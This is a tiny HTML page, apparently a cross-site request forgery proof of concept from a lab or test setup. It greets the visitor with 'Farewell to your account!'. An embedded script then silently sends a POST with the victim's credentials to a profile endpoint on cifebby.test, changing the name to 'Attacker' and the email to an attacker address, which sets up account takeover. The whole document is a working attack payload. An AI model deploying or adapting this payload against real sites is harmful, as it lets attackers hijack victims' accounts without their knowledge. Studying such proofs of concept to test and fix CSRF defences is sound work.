<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Hello, World!</title>
</head>
<body>
	Hello, how are you ?
	Farewell to your account!
	<script>
		var xhr = new XMLHttpRequest();
		xhr.open("POST", "http://cifebby.test/home/profile", true);
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		xhr.withCredentials = true;
		var body = "name=Attacker&email=attacker@mail.com";
		xhr.send(body);
	</script>
</body>
</html>